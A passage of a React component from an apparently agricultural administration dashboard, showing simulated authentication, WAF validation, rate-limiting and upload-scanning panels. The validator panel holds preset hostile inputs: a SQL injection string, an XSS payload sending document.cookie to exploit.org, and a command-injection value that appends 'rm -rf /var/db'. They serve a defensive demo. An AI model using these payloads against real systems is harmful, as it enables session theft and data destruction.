          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "protection" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <ShieldAlert className="w-4 h-4" />
          <span>🛡️ Threat Protection & Validators</span>
        </button>
        <button
          onClick={() => setActiveSubTab("trust")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "trust" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <HelpCircle className="w-4 h-4" />
          <span>🏛️ Trust Center Disclosures</span>
        </button>
        <button
          onClick={() => setActiveSubTab("integrity")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "integrity" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <Database className="w-4 h-4" />
          <span>⚖️ Data Quality & Integrity Hub</span>
        </button>
        <button
          onClick={() => setActiveSubTab("accuracy")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "accuracy" 
              ? "bg-slate-900 text-white dark:bg-cyan-600 animate-pulse" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <CheckCircle2 className="w-4 h-4 text-emerald-500" />
          <span>🎯 Accuracy & Sourcing</span>
        </button>
        <button
          onClick={() => setActiveSubTab("storage")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "storage" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <Database className="w-4 h-4 text-cyan-400" />
          <span>💾 Enterprise Master Storage</span>
        </button>
        <button
          onClick={() => setActiveSubTab("compatibility")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "compatibility" 
              ? "bg-slate-900 text-white dark:bg-cyan-600 animate-pulse" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <Globe className="w-4 h-4 text-pink-500" />
          <span>🌐 Compatibility & PWA Suite</span>
        </button>
        <button
          onClick={() => setActiveSubTab("admin")}
          className={`px-4 py-3 text-xs font-black uppercase tracking-wider rounded-xl transition-all shrink-0 flex items-center gap-2 cursor-pointer ${
            activeSubTab === "admin" 
              ? "bg-slate-900 text-white dark:bg-cyan-600" 
              : "text-slate-500 hover:text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-900/40"
          }`}
        >
          <Users className="w-4 h-4" />
          <span>📊 Admin Operations</span>
        </button>
      </div>

      {/* Primary Panels Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        
        {/* Left 2 Columns: Selected Tab Console */}
        <div className="lg:col-span-2 space-y-8">
          
          {/* TAB A: AUTHENTICATION AND CRYPTOGRAPHY */}
          {activeSubTab === "auth" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8">
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <Lock className="w-4 h-4 text-cyan-500" />
                    Authentication Protocol & Cryptographic Simulation
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Simulate Argon2id password key derivation, JSON Web Token (JWT) handshakes, and TOTP MFA setup.
                  </p>
                </div>
              </div>

              {/* Grid: Credentials Form & Argon2 derivation */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* Credentials input and password strength */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">Credential Challenge Matrix</span>
                  
                  <div className="space-y-3">
                    <div>
                      <label className="text-[9px] font-black uppercase text-slate-400 block mb-1">Simulated Username</label>
                      <input 
                        type="text" 
                        value={username} 
                        onChange={(e) => setUsername(e.target.value)}
                        className="w-full px-3 py-2 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-xs font-bold dark:text-white"
                      />
                    </div>

                    <div>
                      <label className="text-[9px] font-black uppercase text-slate-400 block mb-1">Simulated Plaintext Password</label>
                      <div className="relative">
                        <input 
                          type={showPassword ? "text" : "password"} 
                          value={password} 
                          onChange={(e) => setPassword(e.target.value)}
                          className="w-full px-3 py-2 pr-9 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-xs font-bold dark:text-white"
                        />
                        <button
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-2.5 top-2.5 text-slate-400 hover:text-slate-600"
                        >
                          {showPassword ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>

                    {/* Strength Indicator */}
                    <div className="space-y-1.5 pt-1">
                      <div className="flex items-center justify-between text-[9px] font-black uppercase">
                        <span className="text-slate-400">Entropy Assessment:</span>
                        <span className="text-slate-700 dark:text-slate-300">{pwdStrength.feedback}</span>
                      </div>
                      <div className="h-1.5 w-full bg-slate-200 dark:bg-slate-800 rounded-full overflow-hidden">
                        <div className={`h-full ${pwdStrength.color}`} style={{ width: `${(pwdStrength.score / 5) * 100}%` }} />
                      </div>
                    </div>
                  </div>

                  <div className="pt-2">
                    <span className="text-[8px] font-semibold text-slate-400 leading-normal block">
                      🛡️ <span className="font-bold text-slate-500">Argon2id Hash Result (Derived Server-side):</span><br/>
                      <code className="font-mono bg-slate-200 dark:bg-slate-950 px-1 py-0.5 rounded text-cyan-600 dark:text-cyan-400 block mt-1 break-all text-[8px]">
                        $argon2id$v=19$m=65536,t=4,p=1$c2FtbWl1bV9zYWx0XzIwMjY$ZpU7RjLqP...
                      </code>
                    </span>
                  </div>
                </div>

                {/* TOTP MFA Sandbox */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider">TOTP Multi-Factor Enrollment</span>
                      <span className={`text-[8px] font-black uppercase px-2 py-0.5 rounded ${mfaEnabled ? "bg-emerald-100 text-emerald-800" : "bg-slate-200 text-slate-600"}`}>
                        {mfaEnabled ? "Active" : "Disabled"}
                      </span>
                    </div>

                    <p className="text-[10px] text-slate-500 font-medium">
                      Configure future-ready MFA by syncing our simulated secure seed with an authenticator applet.
                    </p>

                    {mfaEnabled ? (
                      <div className="p-3.5 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-white/5 text-center space-y-3">
                        <div className="flex justify-center">
                          {/* Simulated QR Code using styling */}
                          <div className="w-24 h-24 bg-slate-950 p-2 rounded flex flex-wrap gap-1 border border-slate-800">
                            {Array.from({ length: 64 }).map((_, i) => (
                              <div key={i} className={`w-2.5 h-2.5 ${((i + 3) % 4 === 0 || i % 7 === 0 || (i > 10 && i < 20)) ? "bg-white" : "bg-transparent"}`} />
                            ))}
                          </div>
                        </div>
                        <div className="space-y-1.5">
                          <span className="text-[8px] font-mono text-slate-400 block uppercase">Manual Secure Seed Key:</span>
                          <code className="text-[9px] font-black font-mono text-cyan-600 dark:text-cyan-400 bg-slate-50 dark:bg-slate-950 px-2 py-0.5 rounded border border-slate-100 dark:border-slate-800 block">
                            ZBTL AGRI MIND 2026 XK84
                          </code>
                        </div>

                        <div className="flex gap-2">
                          <input 
                            type="text" 
                            placeholder="6-Digit OTP Code"
                            value={mfaCode}
                            onChange={(e) => setMfaCode(e.target.value.replace(/[^0-9]/g, "").slice(0, 6))}
                            className="flex-1 px-3 py-1 bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-white/5 rounded-lg text-center font-mono font-black text-xs text-slate-800 dark:text-white"
                          />
                          <button
                            onClick={() => {
                              if (mfaCode.length === 6) {
                                setMfaVerified(true);
                                addLog("MFA Token Confirmed", "info", "AuthEngine", "Simulated TOTP verification code verified successfully");
                              } else {
                                alert("Please enter a valid 6-digit code!");
                              }
                            }}
                            className="bg-emerald-600 text-white text-[9px] font-black uppercase px-3 py-1 rounded-lg cursor-pointer"
                          >
                            Verify
                          </button>
                        </div>

                        {mfaVerified && (
                          <div className="text-[9px] font-bold text-emerald-600 flex items-center justify-center gap-1.5">
                            <ShieldCheck className="w-3.5 h-3.5 text-emerald-500 animate-bounce" />
                            <span>MFA Device Authenticated</span>
                          </div>
                        )}
                      </div>
                    ) : (
                      <button
                        onClick={() => {
                          setMfaEnabled(true);
                          addLog("TOTP MFA Requested", "info", "AuthEngine", "Initiated interactive setup flow for security QR code sync");
                        }}
                        className="w-full py-3 bg-slate-900 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl cursor-pointer"
                      >
                        Enroll MFA Device
                      </button>
                    )}
                  </div>
                </div>

              </div>

              {/* JWT Decoded payload block */}
              <div className="space-y-4 pt-4 border-t border-slate-100 dark:border-white/5">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider">JWT Access Token Encoder & Decoder</span>
                  <div className="flex items-center gap-2">
                    <span className="text-[9px] text-slate-500 font-bold">Simulate active role claims:</span>
                    <select
                      value={jwtPayload.role}
                      onChange={(e) => {
                        const nextRole = e.target.value as any;
                        setJwtPayload(prev => ({ ...prev, role: nextRole }));
                        addLog("JWT Payload Updated", "info", "SessionManager", `Modified authorization claims context to: ${nextRole}`);
                      }}
                      className="text-[9px] font-black px-2 py-0.5 rounded border border-slate-200 bg-slate-50 dark:bg-slate-950 dark:text-white"
                    >
                      <option value="farmer">Farmer Claim</option>
                      <option value="staff">Barangay Staff Claim</option>
                      <option value="admin">Municipal Admin Claim</option>
                    </select>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* Encoded JWT string */}
                  <div className="p-4 bg-slate-950 text-slate-300 rounded-2xl font-mono text-[9px] border border-slate-800 space-y-2 flex flex-col justify-between">
                    <div>
                      <span className="text-slate-500 font-bold text-[8px] block uppercase mb-1">Encoded JWT String (Sent in Auth Header)</span>
                      <div className="break-all text-slate-200 select-all p-3 bg-slate-900/50 rounded-xl leading-relaxed border border-slate-800">
                        <span className="text-rose-400">{accessToken.split('.')[0]}</span>.
                        <span className="text-cyan-400">{accessToken.split('.')[1]}</span>.
                        <span className="text-emerald-400">{accessToken.split('.')[2]}</span>
                      </div>
                    </div>
                    <div className="flex items-center justify-between text-[8px] text-slate-500 mt-2">
                      <span>Header.Payload.Signature</span>
                      <button 
                        onClick={() => {
                          navigator.clipboard.writeText(accessToken);
                          alert("Access token string copied to clipboard!");
                        }}
                        className="text-cyan-400 flex items-center gap-1 hover:text-cyan-300"
                      >
                        <Copy className="w-3 h-3" /> Copy String
                      </button>
                    </div>
                  </div>

                  {/* Decoded JWT Payload */}
                  <div className="p-4 bg-slate-950 text-slate-300 rounded-2xl font-mono text-[9px] border border-slate-800 space-y-2">
                    <span className="text-slate-500 font-bold text-[8px] block uppercase mb-1">Decoded JWT claims (Cryptographically verified)</span>
                    <pre className="p-3 bg-slate-900/50 rounded-xl leading-normal text-emerald-400 border border-slate-800">
                      {JSON.stringify(jwtPayload, null, 2)}
                    </pre>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB B: THREAT PROTECTION & VALIDATORS */}
          {activeSubTab === "protection" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8">
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4 text-emerald-500" />
                    WAF Rule Simulator & Input Schema Validators
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Simulate real-time defenses against malicious parameters, API rate throttling, and executable malware scanner layers.
                  </p>
                </div>
              </div>

              {/* Grid: Validation Demo & Rate limiter */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* Panel 1: Input injection tester */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">Real-time Schema Validator Sandbox</span>
                  
                  <div>
                    <label className="text-[9px] font-black uppercase text-slate-400 block mb-1">Test Field Parameter</label>
                    <input 
                      type="text" 
                      placeholder="Type alphanumeric values or try malicious payloads below..."
                      value={inputTestValue}
                      onChange={(e) => {
                        setInputTestValue(e.target.value);
                        testInputAgainstRules(e.target.value);
                      }}
                      className="w-full px-3 py-2 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-xl text-xs font-bold dark:text-white"
                    />
                  </div>

                  {/* Predefined Threats injections buttons */}
                  <div className="space-y-2">
                    <span className="text-[8px] font-black uppercase text-slate-400 block">Inject Malicious Vectors:</span>
                    <div className="flex flex-wrap gap-1.5">
                      <button
                        onClick={() => {
                          const injection = "SELECT * FROM users WHERE '1'='1";
                          setInputTestValue(injection);
                          testInputAgainstRules(injection);
                        }}
                        className="px-2 py-1 bg-rose-50 text-rose-700 dark:bg-rose-950/40 dark:text-rose-400 text-[8px] font-black uppercase rounded-lg border border-rose-100 dark:border-rose-900/40 cursor-pointer"
                      >
                        SQL Injection
                      </button>
                      <button
                        onClick={() => {
                          const injection = "<script>fetch('http://exploit.org?cookies=' + document.cookie)</script>";
                          setInputTestValue(injection);
                          testInputAgainstRules(injection);
                        }}
                        className="px-2 py-1 bg-rose-50 text-rose-700 dark:bg-rose-950/40 dark:text-rose-400 text-[8px] font-black uppercase rounded-lg border border-rose-100 dark:border-rose-900/40 cursor-pointer"
                      >
                        XSS HTML Injection
                      </button>
                      <button
                        onClick={() => {
                          const injection = "farm_soil_data.csv; rm -rf /var/db";
                          setInputTestValue(injection);
                          testInputAgainstRules(injection);
                        }}
                        className="px-2 py-1 bg-rose-50 text-rose-700 dark:bg-rose-950/40 dark:text-rose-400 text-[8px] font-black uppercase rounded-lg border border-rose-100 dark:border-rose-900/40 cursor-pointer"
                      >
                        Command Injection
                      </button>
                    </div>
                  </div>

                  {/* Validation results logs block */}
                  <div className="space-y-2 pt-2 border-t border-slate-200 dark:border-white/5">
                    {validationResult.status !== "idle" && (
                      <div className={`p-3 rounded-xl border text-[10px] space-y-1.5 ${
                        validationResult.status === "blocked" 
                          ? "bg-rose-50 text-rose-900 border-rose-100 dark:bg-rose-950/20 dark:text-rose-400 dark:border-rose-900/40" 
                          : "bg-emerald-50 text-emerald-900 border-emerald-100 dark:bg-emerald-950/20 dark:text-emerald-400 dark:border-emerald-900/40"
                      }`}>
                        <div className="flex items-center gap-1.5 font-bold">
                          {validationResult.status === "blocked" ? <XCircle className="w-4 h-4 text-rose-500 shrink-0" /> : <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />}
                          <span>{validationResult.message}</span>
                        </div>
                        
                        {validationResult.rules && (
                          <div className="font-mono text-[8px] text-slate-500 dark:text-slate-400 space-y-1 bg-black/5 dark:bg-black/40 p-2 rounded-lg">
                            <span className="font-bold uppercase text-[7px] block text-slate-400">Validated Schema Actions:</span>
                            {validationResult.rules.map((rule, idx) => (
                              <div key={idx} className="flex items-center gap-1">
                                <span className="text-cyan-500">✔</span>
                                <span>{rule}</span>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </div>

                {/* Panel 2: Rate Limiter sandbox */}
                <div className="space-y-4 bg-slate-50 dark:bg-slate-950/40 p-5 rounded-2xl border border-slate-100 dark:border-white/5 flex flex-col justify-between">
                  <div className="space-y-3">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">API Rate Limiting & Lockout Throttler</span>
                    
                    <p className="text-[10px] text-slate-500 font-medium leading-relaxed">
                      WAF rules limit clients to 5 requests per 15 seconds. Trigger rapid mock requests below to test threshold defenses.
                    </p>

                    {/* Progress indicators bars */}
                    <div className="space-y-1.5">
                      <div className="flex justify-between text-[8px] font-black text-slate-400 uppercase">
                        <span>Window Capacity:</span>
                        <span>{rateLimitCount} / 5 Requests</span>
                      </div>
                      <div className="h-2 w-full bg-slate-200 dark:bg-slate-800 rounded-full overflow-hidden flex gap-0.5">
                        {Array.from({ length: 5 }).map((_, i) => (
                          <div 
                            key={i} 
                            className={`h-full flex-1 transition-colors ${
                              i < rateLimitCount 
                                ? rateLimitCount >= 5 
                                  ? "bg-rose-500 animate-pulse" 
                                  : "bg-cyan-500" 
                                : "bg-slate-300 dark:bg-slate-700"
                            }`} 
                          />
                        ))}
                      </div>
                    </div>

                    {rateLimitLock > 0 && (
                      <div className="p-3 bg-rose-50 dark:bg-rose-950/35 border border-rose-100 dark:border-rose-900/40 text-rose-800 dark:text-rose-400 text-xs font-black rounded-xl text-center space-y-1 animate-pulse">
                        <AlertOctagon className="w-5 h-5 mx-auto text-rose-500" />
                        <span>HTTP 429 TOO MANY REQUESTS</span>
                        <p className="text-[9px] font-semibold text-rose-600 dark:text-rose-400">
                          IP Lockout triggered. Backing off request queue: <span className="font-mono text-lg">{rateLimitLock}s</span>
                        </p>
                      </div>
                    )}
                  </div>

                  <button
                    onClick={triggerApiRequest}
                    disabled={rateLimitLock > 0}
                    className="w-full py-3 bg-slate-900 text-white dark:bg-cyan-600 dark:hover:bg-cyan-700 text-xs font-black uppercase rounded-xl transition-all disabled:opacity-50 cursor-pointer"
                  >
                    {rateLimitLock > 0 ? "Throttled Lockout Active" : "Trigger Simulated API Request"}
                  </button>
                </div>

              </div>

              {/* Secure File Upload Simulation Panel */}
              <div className="space-y-4 pt-4 border-t border-slate-100 dark:border-white/5">
                <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">Secure File Upload Simulation Engine</span>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {/* Form Trigger Buttons */}
                  <div className="p-5 bg-slate-50 dark:bg-slate-950/30 border border-slate-100 dark:border-white/5 rounded-2xl space-y-3 flex flex-col justify-between">
                    <div className="space-y-1">
                      <span className="text-[9px] font-black uppercase text-slate-400 block">Test Malicious Scan Stepper</span>
                      <p className="text-[10px] text-slate-500 font-medium">
                        Upload custom data reports. Files are renamed, isolated, checked for extension, magic bytes verified, and scanned for malware signatures.
                      </p>
                    </div>

                    <div className="flex gap-2">
                      <button
                        onClick={() => handleSimulateUpload(false)}
                        className="flex-1 py-2 bg-emerald-600 hover:bg-emerald-700 text-white text-[10px] font-black uppercase rounded-lg transition-colors cursor-pointer"
                      >
                        Upload Safe Report (.pdf)
                      </button>
                      <button
                        onClick={() => handleSimulateUpload(true)}
                        className="flex-1 py-2 bg-rose-600 hover:bg-rose-700 text-white text-[10px] font-black uppercase rounded-lg transition-colors cursor-pointer"
                      >
                        Upload Exploitative (.exe)
                      </button>
                    </div>
                  </div>

                  {/* Scanners results visualization */}
                  <div className="p-5 bg-slate-50 dark:bg-slate-950/30 border border-slate-100 dark:border-white/5 rounded-2xl justify-center flex flex-col">
                    {uploadedFile ? (
                      <div className="space-y-3">
                        <div className="flex items-center justify-between border-b border-slate-200 dark:border-white/5 pb-2">
                          <div>
                            <span className="text-[8px] font-mono font-bold text-slate-400 uppercase">Input file:</span>
                            <h4 className="font-extrabold text-xs text-slate-900 dark:text-white mt-0.5">{uploadedFile.name}</h4>
                          </div>
                          <span className="text-[9px] font-mono text-slate-400">{uploadedFile.size}</span>
                        </div>

                        {uploadedFile.status === "scanning" && (
                          <div className="flex items-center gap-3 py-1">
                            <RefreshCw className="w-4 h-4 text-cyan-500 animate-spin" />
                            <span className="text-[10px] font-bold text-cyan-600 animate-pulse">Running heuristic quarantine scans...</span>
                          </div>
                        )}

                        {uploadedFile.status === "infected" && (
                          <div className="p-3 bg-rose-50 text-rose-900 border border-rose-100 dark:bg-rose-950/40 dark:text-rose-400 dark:border-rose-900/40 rounded-xl space-y-1">
                            <div className="flex items-center gap-1.5 font-bold text-[10px]">
                              <XCircle className="w-4 h-4 text-rose-500 shrink-0" />
                              <span>VIRUS DETECTED: DROP_SECTOR_INTEGRITY</span>
                            </div>
                            <p className="text-[8px] font-mono text-rose-600 dark:text-rose-400 leading-normal">
                              File rejected. Executable extension blocks & suspicious hash signature found during heuristic inspection.
                            </p>
                          </div>
                        )}

                        {uploadedFile.status === "secure" && (
                          <div className="p-3 bg-emerald-50 text-emerald-900 border border-emerald-100 dark:bg-emerald-950/40 dark:text-emerald-400 dark:border-emerald-900/40 rounded-xl space-y-1.5">
                            <div className="flex items-center gap-1.5 font-bold text-[10px]">
                              <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                              <span>PASS: Clean and Renamed</span>
                            </div>
                            <div className="text-[8px] font-mono space-y-1 leading-normal">
                              <div><span className="text-slate-400 uppercase font-bold">MIME:</span> application/pdf (verified)</div>
                              <div><span className="text-slate-400 uppercase font-bold">SHA-256:</span> e3b0c44298fc1c149afbf4c8996...</div>
                              <div><span className="text-slate-400 uppercase font-bold">Stored Name:</span> <span className="text-cyan-600 dark:text-cyan-400 font-bold">{uploadedFile.secureName}</span></div>
                            </div>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="text-center py-6 text-slate-400">
                        <Upload className="w-8 h-8 mx-auto stroke-1 text-slate-300 animate-bounce mb-2" />
                        <span className="text-[10px] font-bold uppercase tracking-wider block">Quarantine Chamber Empty</span>
                        <p className="text-[9px] font-semibold text-slate-500 mt-1">Upload a testing payload to start verification cycle.</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB: DATA QUALITY & INTEGRITY HUB */}
          {activeSubTab === "integrity" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8 animate-fade-in">
              {/* Header */}
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <Database className="w-4 h-4 text-cyan-500" />
                    Data Quality, Compliance & Relational Integrity Hub
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Monitor system metrics, test Philippine RSBSA schema constraints, simulate database transactions with automatic rollback protection, and manage deleted profiles.
                  </p>
                </div>
              </div>

              {/* SECTION 1: Master Data Quality Dashboard & AI Inspector Suite */}
              <div className="space-y-6">
                <div className="flex items-center justify-between flex-wrap gap-4 border-b border-slate-100 dark:border-white/5 pb-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">1. Administrative Data Quality Dashboard</span>
                    <p className="text-[10px] text-slate-500 font-semibold leading-none">
                      Continuous data evaluation across 10 quality dimensions. Updates in real-time as telemetry shifts.
                    </p>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="text-[9px] font-mono font-bold text-slate-400">Last Validation: <span className="text-cyan-500">{dqLastValidationTime}</span></span>
                    <button 
                      onClick={handleRefreshDq}
                      disabled={isRefreshingDq}
                      className="px-3 py-1 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 text-slate-700 dark:text-slate-300 text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer flex items-center gap-1"
                    >
                      <RefreshCw className={`w-2.5 h-2.5 ${isRefreshingDq ? "animate-spin" : ""}`} />
                      <span>{isRefreshingDq ? "Recalculating..." : "Re-Validate Now"}</span>
                    </button>
                  </div>
                </div>

                {/* Dashboard Metrics Grid */}
                <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
                  {/* Metric 1: Overall DQ */}
                  <div className="p-4 bg-slate-900 text-white rounded-2xl border border-slate-800 space-y-2 relative overflow-hidden">
                    <div className="absolute top-0 right-0 w-16 h-16 bg-cyan-500/10 rounded-full blur-xl pointer-events-none" />
                    <span className="text-[7px] font-black uppercase text-slate-400 block tracking-wider">Overall Quality</span>
                    <span className="text-2xl font-black block font-mono text-cyan-400">{calcDQOverall()}%</span>
                    <div className="w-full bg-slate-800 rounded-full h-1">
                      <div className="bg-cyan-400 h-1 rounded-full transition-all duration-500" style={{ width: `${calcDQOverall()}%` }} />
                    </div>
                    <span className="text-[8px] text-slate-400 font-semibold block">Composite Score</span>
                  </div>

                  {/* Metric 2: Accuracy */}
                  <div className="p-4 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 space-y-1.5">
                    <span className="text-[7px] font-black uppercase text-slate-400 block tracking-wider">Accuracy Score</span>
                    <span className="text-xl font-black block font-mono text-emerald-500">{calcDQAccuracy()}%</span>
                    <span className="text-[8px] text-slate-500 font-semibold block">Verified Represent</span>
                  </div>

                  {/* Metric 3: Completeness */}
                  <div className="p-4 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 space-y-1.5">
                    <span className="text-[7px] font-black uppercase text-slate-400 block tracking-wider">Completeness</span>
                    <span className="text-xl font-black block font-mono text-blue-500">{calcDQCompleteness()}%</span>
                    <span className="text-[8px] text-slate-500 font-semibold block">Required Fields Filled</span>
                  </div>

                  {/* Metric 4: Consistency */}
                  <div className="p-4 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 space-y-1.5">
                    <span className="text-[7px] font-black uppercase text-slate-400 block tracking-wider">Consistency</span>
                    <span className="text-xl font-black block font-mono text-purple-500">{calcDQConsistency()}%</span>
                    <span className="text-[8px] text-slate-500 font-semibold block">Cross-Module Align</span>
                  </div>

                  {/* Metric 5: Timeliness */}
                  <div className="p-4 bg-slate-50 dark:bg-slate-950/40 rounded-2xl border border-slate-100 dark:border-white/5 space-y-1.5">
                    <span className="text-[7px] font-black uppercase text-slate-400 block tracking-wider">Timeliness</span>
                    <span className="text-xl font-black block font-mono text-amber-500">{calcDQTimeliness()}%</span>
                    <span className="text-[8px] text-slate-500 font-semibold block">Freshness limit (2h)</span>
                  </div>
                </div>

                {/* Sub Scorecard list: duplicates and missing */}
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  <div className="p-3.5 bg-slate-50 dark:bg-slate-950/20 rounded-2xl border border-slate-100 dark:border-white/5 flex items-center justify-between leading-none">
                    <div>
                      <span className="text-[7px] font-black text-slate-400 uppercase block tracking-wider mb-1">Duplicate Records</span>
                      <span className={`text-sm font-black font-mono ${dqDuplicateRecords > 0 ? "text-amber-500" : "text-emerald-500"}`}>{dqDuplicateRecords}</span>
                    </div>
                    {dqDuplicateRecords > 0 && (
                      <button 
                        onClick={() => {
                          setDqDuplicateRecords(0);
                          addLog("Deduplication Run", "info", "UniqueConstraintDaemon", "Purged active duplicate profiles from local registries.");
                        }}
                        className="px-2 py-0.5 bg-amber-500 hover:bg-amber-600 text-white text-[7px] font-black uppercase rounded cursor-pointer transition-colors"
                      >
                        Resolve
                      </button>
                    )}
                  </div>

                  <div className="p-3.5 bg-slate-50 dark:bg-slate-950/20 rounded-2xl border border-slate-100 dark:border-white/5 flex items-center justify-between leading-none">
                    <div>
                      <span className="text-[7px] font-black text-slate-400 uppercase block tracking-wider mb-1">Missing Fields</span>
                      <span className="text-sm font-black font-mono text-slate-800 dark:text-white">{dqMissingValues} points</span>
                    </div>
                    {dqMissingValues > 0 && (
                      <button 
                        onClick={() => {
                          setDqMissingValues(0);
                          addLog("Missing Fields Resolved", "info", "ProvenanceEngine", "Filled in missing profile boundaries and RSBSA attributes.");
                        }}
                        className="px-2 py-0.5 bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300 text-[7px] font-black uppercase rounded cursor-pointer transition-colors"
                      >
                        Clear
                      </button>
                    )}
                  </div>

                  <div className="p-3.5 bg-slate-50 dark:bg-slate-950/20 rounded-2xl border border-slate-100 dark:border-white/5 flex items-center justify-between leading-none">
                    <div>
                      <span className="text-[7px] font-black text-slate-400 uppercase block tracking-wider mb-1">Failed Imports</span>
                      <span className={`text-sm font-black font-mono ${dqFailedImports > 0 ? "text-rose-500" : "text-slate-500"}`}>{dqFailedImports} items</span>
                    </div>
                    {dqFailedImports > 0 && (
                      <button 
                        onClick={() => {
                          setDqFailedImports(0);
                          addLog("Failed Imports Cleared", "info", "ProvenanceEngine", "Purged malformed payload records from the import buffer.");
                        }}
                        className="px-2 py-0.5 bg-rose-500 hover:bg-rose-600 text-white text-[7px] font-black uppercase rounded cursor-pointer transition-colors"
                      >
                        Purge
                      </button>
                    )}
                  </div>

                  <div className="p-3.5 bg-slate-50 dark:bg-slate-950/20 rounded-2xl border border-slate-100 dark:border-white/5 flex items-center justify-between leading-none">
                    <div>
                      <span className="text-[7px] font-black text-slate-400 uppercase block tracking-wider mb-1">Sync Errors</span>
                      <span className={`text-sm font-black font-mono ${dqSyncErrors > 0 ? "text-rose-500" : "text-slate-500"}`}>{dqSyncErrors} errors</span>
